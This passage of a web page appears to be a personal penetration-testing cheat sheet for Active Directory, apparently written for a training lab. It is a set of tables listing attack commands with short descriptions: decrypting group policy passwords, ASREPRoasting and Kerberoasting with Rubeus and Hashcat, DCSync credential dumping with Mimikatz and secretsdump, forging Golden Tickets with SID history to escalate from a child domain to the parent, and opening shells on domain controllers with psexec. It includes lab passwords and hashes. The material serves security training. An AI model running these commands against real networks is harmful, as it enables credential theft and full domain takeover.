contents of a share hosted on a Windows target from the context of a currently logged on user. Performed from a Windows-based host.</td> </tr> </tbody> </table> <h1 id=group-policy-enumeration-attacks>Group Policy Enumeration &amp; Attacks<a class=headerlink href=#group-policy-enumeration-attacks title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE</code></td> <td>Tool used to decrypt a captured <code>group policy preference password</code> from a Linux-based host.</td> </tr> <tr> <td><code>crackmapexec smb -L \| grep gpp</code></td> <td>Locates and retrieves a <code>group policy preference password</code> using <code>CrackMapExec</code>, the filters the output using <code>grep</code>. Peformed from a Linux-based host.</td> </tr> <tr> <td><code>crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin</code></td> <td>Locates and retrieves any credentials stored in the <code>SYSVOL</code> share of a Windows target using <code>CrackMapExec</code> from a Linux-based host.</td> </tr> <tr> <td><code>Get-DomainGPO \| select displayname</code></td> <td>PowerView tool used to enumerate GPO names in a target Windows domain from a Windows-based host.</td> </tr> <tr> <td><code>Get-GPO -All \| Select DisplayName</code></td> <td>PowerShell cmd-let used to enumerate GPO names. Performed from a Windows-based host.</td> </tr> <tr> <td><code>$sid=Convert-NameToSid "Domain Users"</code></td> <td>Creates a variable called <code>$sid</code> that is set equal to the <code>Convert-NameToSid</code> tool and specifies the group account <code>Domain Users</code>. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainGPO \| Get-ObjectAcl \| ?{$_.SecurityIdentifier -eq $sid</code></td> <td>PowerView tool that is used to check if the <code>Domain Users</code> (<code>eq $sid</code>) group has any rights over one or more GPOs. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532</code></td> <td>PowerShell cmd-let used to display the name of a GPO given a <code>GUID</code>. Performed from a Windows-based host.</td> </tr> </tbody> </table> <h1 id=asreproasting>ASREPRoasting<a class=headerlink href=#asreproasting title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>Get-DomainUser -PreauthNotRequired \| select samaccountname,userprincipalname,useraccountcontrol \| fl</code></td> <td>PowerView based tool used to search for the <code>DONT_REQ_PREAUTH</code> value across in user accounts in a target Windows domain. Performed from a Windows-based host.</td> </tr> <tr> <td><code>.\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat</code></td> <td>Uses <code>Rubeus</code> to perform an <code>ASEP Roasting attack</code> and formats the output for <code>Hashcat</code>. Performed from a Windows-based host.</td> </tr> <tr> <td><code>hashcat -m 18200 lcorp_asrep /usr/share/wordlists/rockyou.txt</code></td> <td>Uses <code>Hashcat</code> to attempt to crack the captured hash using a wordlist (<code>rockyou.txt</code>). Performed from a Linux-based host.</td> </tr> <tr> <td><code>kerbrute userenum -d legalcorp.local --dc 172.16.5.5 /opt/jsmith.txt</code></td> <td>Enumerates users in a target Windows domain and automatically retrieves the <code>AS</code> for any users found that don't require Kerberos pre-authentication. Performed from a Linux-based host.</td> </tr> </tbody> </table> <h1 id=trust-relationships-child-parent-trusts>Trust Relationships - Child &gt; Parent Trusts<a class=headerlink href=#trust-relationships-child-parent-trusts title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>Import-Module activedirectory</code></td> <td>Used to import the <code>Active Directory</code> module. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-ADTrust -Filter *</code></td> <td>PowerShell cmd-let used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainTrust</code></td> <td>PowerView tool used to enumerate a target Windows domain's trust relationships. Performed from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainTrustMapping</code></td> <td>PowerView tool used to perform a domain trust mapping from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainUser -Domain LOGISTICS.legalcorp.local \| select SamAccountName</code></td> <td>PowerView tools used to enumerate users in a target child domain from a Windows-based host.</td> </tr> <tr> <td><code>mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt</code></td> <td>Uses Mimikatz to obtain the <code>KRBTGT</code> account's <code>NT Hash</code> from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainSID</code></td> <td>PowerView tool used to get the SID for a target child domain from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainGroup -Domain legalcorp.local -Identity "Enterprise Admins" \| select distinguishedname,objectsid</code></td> <td>PowerView tool used to obtain the <code>Enterprise Admins</code> group's SID from a Windows-based host.</td> </tr> <tr> <td><code>ls \\academy-ea-dc01.legalcorp.local\c$</code></td> <td>Used to attempt to list the contents of the C drive on a target Domain Controller. Performed from a Windows-based host.</td> </tr> <tr> <td><code>mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.legalcorp.local /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt</code></td> <td>Uses <code>Mimikatz</code> to create a <code>Golden Ticket</code> from a Windows-based host .</td> </tr> <tr> <td><code>.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.legalcorp.local /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt</code></td> <td>Uses <code>Rubeus</code> to create a <code>Golden Ticket</code> from a Windows-based host.</td> </tr> <tr> <td><code>mimikatz # lsadump::dcsync /user:LEGALCORP\lab_adm</code></td> <td>Uses <code>Mimikatz</code> to perform a DCSync attack from a Windows-based host.</td> </tr> <tr> <td><code>secretsdump.py logistics.legalcorp.local/user_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt</code></td> <td>Impacket tool used to perform a DCSync attack from a Linux-based host.</td> </tr> <tr> <td><code>lookupsid.py logistics.legalcorp.local/user_adm@172.16.5.240</code></td> <td>Impacket tool used to perform a <code>SID Brute forcing</code> attack from a Linux-based host.</td> </tr> <tr> <td><code>lookupsid.py logistics.legalcorp.local/user_adm@172.16.5.240 \| grep "Domain SID"</code></td> <td>Impacket tool used to retrieve the SID of a target Windows domain from a Linux-based host.</td> </tr> <tr> <td><code>lookupsid.py logistics.legalcorp.local/user_adm@172.16.5.5 \| grep -B12 "Enterprise Admins"</code></td> <td>Impacket tool used to retrieve the <code>SID</code> of a target Windows domain and attach it to the Enterprise Admin group's <code>RID</code> from a Linux-based host.</td> </tr> <tr> <td><code>ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.legalcorp.local -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker</code></td> <td>Impacket tool used to create a <code>Golden Ticket</code> from a Linux-based host.</td> </tr> <tr> <td><code>export KRB5CCNAME=hacker.ccache</code></td> <td>Used to set the <code>KRB5CCNAME Environment Variable</code> from a Linux-based host.</td> </tr> <tr> <td><code>psexec.py LOGISTICS.legalcorp.local/hacker@academy-ea-dc01.legalcorp.local -k -no-pass -target-ip 172.16.5.5</code></td> <td>Impacket tool used to establish a shell session with a target Domain Controller from a Linux-based host.</td> </tr> <tr> <td><code>raiseChild.py -target-exec 172.16.5.5 LOGISTICS.legalcorp.local/user_adm</code></td> <td>Impacket tool that automatically performs an attack that escalates from child to parent domain.</td> </tr> </tbody> </table> <h1 id=trust-relationships-cross-forest>Trust Relationships - Cross-Forest<a class=headerlink href=#trust-relationships-cross-forest title="Permanent link">&para;</a></h1> <table> <thead> <tr> <th>Command</th> <th>Description</th> </tr> </thead> <tbody> <tr> <td><code>Get-DomainUser -SPN -Domain LEGALLOGISTICS.LOCAL \| select SamAccountName</code></td> <td>PowerView tool used to enumerate accounts for associated <code>SPNs</code> from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainUser -Domain LEGALLOGISTICS.LOCAL -Identity mssqlsvc \| select samaccountname,memberof</code></td> <td>PowerView tool used to enumerate the <code>mssqlsvc</code> account from a Windows-based host.</td> </tr> <tr> <td><code>.\Rubeus.exe kerberoast /domain:LEGALLOGISTICS.LOCAL /user:mssqlsvc /nowrap</code></td> <td>Uses <code>Rubeus</code> to perform a Kerberoasting Attack against a target Windows domain (<code>/domain:LEGALLOGISTICS.local</code>) from a Windows-based host.</td> </tr> <tr> <td><code>Get-DomainForeignGroupMember -Domain LEGALLOGISTICS.LOCAL</code></td> <td>PowerView tool used to enumerate groups with users that do not belong to the domain from a Windows-based host.</td> </tr> <tr> <td><code>Enter-PSSession -ComputerName ACADEMY-EA-DC03.LEGALLOGISTICS.LOCAL -Credential LEGALCORP\administrator</code></td> <td>PowerShell cmd-let used to remotely connect to a target Windows system from a Windows-based host.</td> </tr> <tr> <td><code>GetUserSPNs.py -request -target-domain LEGALLOGISTICS.LOCAL legalcorp.local/wley</code></td> <td>Impacket tool used to request (<code>-request</code>) the TGS ticket of an account in a target Windows domain (<code>-target-domain</code>) from a Linux-based host.</td> </tr> <tr> <td><code>bloodhound-python -d legalcorp.local -dc ACADEMY-EA-DC01 -c All -u forend -p Klmcargo2</code></td> <td>Runs the Python implementation of <code>BloodHound</code> against a target Windows domain from a Linux-based host.</td> </tr> <tr> <td><code>zip -r lcorp_bh.zip *.json</code></td> <td>Used to compress multiple files into 1 single <code>.zip</code> file to be uploaded into the BloodHound GUI.</td> </tr> </tbody> </table> </article> </div> <script>var input,hash=location.hash.slice(1);hash.startsWith("__tabbed_")&&((input=document.getElementById(hash)).checked=!0)</script> </div> <a href=# class="md-top md-icon" data-md-component=top hidden> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg> Back to top </a> </main> <footer class=md-footer> <nav class="md-footer__inner md-grid" aria-label=Footer> <a href=../cheatsheet_aid/ class="md-footer__link md-footer__link--prev" aria-label="Previous: Basics" rel=prev> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg> </div> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Previous </span> Basics </div> </div> </a> <a href=../exploitation/ class="md-footer__link md-footer__link--next" aria-label="Next: Exploitation" rel=next> <div class=md-footer__title> <div class=md-ellipsis> <span class=md-footer__direction> Next </span> Exploitation </div> </div> <div class="md-footer__button md-icon"> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4Z"/></svg> </div> </a> </nav> <div class="md-footer-meta md-typeset"> <div class="md-footer-meta__inner md-grid"> <div class=md-copyright> <div class=md-copyright__highlight> Copyright &copy; 2021 - 2022 neutronsec </div> </div> <div class=md-social> <a href=https://github.com/neutronsec target=_blank rel=noopener title=github.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 496 512"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg> </a> <a href=https://twitter.com/neutronctf target=_blank rel=noopener title=twitter.com class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 512 512"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg> </a> <a href=https://secops.cc target=_blank rel=noopener title=secops.cc class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg> </a> <a href=mailto:hello@neutronsec.com target=_blank rel=noopener title class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 24 24"><path d="M20 4H4c-1.11 0-2 .89-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2m-3 13H7v-2h10m0-2H7v-2h10m3-2h-3V6h3"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../..", "features": ["announce.dismiss", "content.code.annotate", "content.tooltips", "navigation.indexes", "navigation.sections", "navigation.tabs", "navigation.top", "navigation.tracking", "search.highlight", "search.share", "search.suggest", "toc.follow", "toc.integrate"], "search": "../../../assets/javascripts/workers/search.720157f5.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.config.lang": "en", "search.config.pipeline": "stopWordFilter", "search.config.separator": "[\\s\\-]+", "search.placeholder": "Search", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version.title": "Select version"}}</script> <script src=../../../assets/javascripts/bundle.d36b1844.min.js></script> </body> </html>